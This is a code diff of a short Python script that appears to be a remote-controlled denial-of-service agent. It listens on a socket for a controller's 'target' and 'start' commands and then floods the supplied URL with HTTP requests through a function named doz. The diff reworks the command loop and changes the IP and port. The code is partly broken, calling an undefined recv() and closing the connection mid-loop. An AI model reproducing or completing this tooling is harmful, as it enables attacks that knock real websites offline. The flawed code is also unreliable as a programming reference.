@@ -1,8 +1,7 @@
 import socket, os, requests, sys
 
-ip = '10.9.1.88'
-mahp ='10.9.1.88'
-port = 1234
+ip = '10.9.1.23'
+port = 6663
 
 def doz(url):
 	try:
@@ -10,32 +9,38 @@ def doz(url):
 			r = requests.get(url)
 
 	except:
+		pass
+
 
 def c_listen():
-	try:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((ip, port))
-		s.bind((ip, port))
-		s.listen(1)
-		con, adr = s.accept()
+	
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.bind((ip, port))
+	s.listen(1)
+	con, adr = s.accept()
+	print(adr,' is connected!')
+	url = ''
 
-		url = ''
+	while True:
+		cmd = con.recv(1024).decode()
+		if cmd == 'gg':
+			con.send(f'connection closed from {ip}'.encode())
+			con.close()
+			break
+		elif cmd == 'target':
+			con.send('tar'.encode())
+			if recv(1024):
+				con.send('target loaded'.encode())
+				url = con.recv(1024).decode()
+				print(url)
+				con.close()
+		elif cmd == 'start':
+			doz(url)
+			
+		else:
+			con.send('command not found!'.encode())
 
-		while True:
-			cmd = s.recv(1024).decode()
-			if cmd == 'gg':
-				s.send(('connection closed..'))
-				s.close()
-				break
-			elif cmd == 'target':
-				s.send(('tar'.encode()))
-				if s.recv(1024):
-					s.send(('target loaded'.encode()))
-				url = s.recv(1024).decode()
-			elif cmd == 'start':
-				doz(url)
-			else:
-				s.send(('command not found!'.encode()))
+	
 
-	except:
-		print('Err')
+
+c_listen()
